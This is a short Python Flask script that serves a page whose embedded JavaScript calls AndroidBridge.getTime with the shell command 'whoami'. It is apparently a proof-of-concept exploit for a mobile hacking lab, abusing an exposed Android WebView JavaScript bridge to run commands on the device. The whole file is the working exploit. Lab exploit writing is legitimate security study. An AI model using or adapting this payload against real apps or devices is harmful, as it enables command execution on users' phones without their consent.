from flask import *
app = Flask(__name__)

@app.route("/mobilehackinglab.com")
def exp():
    return """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <title>Document</title>
    </head>
    <body>
        <script>
        alert(AndroidBridge.getTime("whoami"));
        </script>
    </body>
    </html>
    """

app.run("0.0.0.0",port=80)
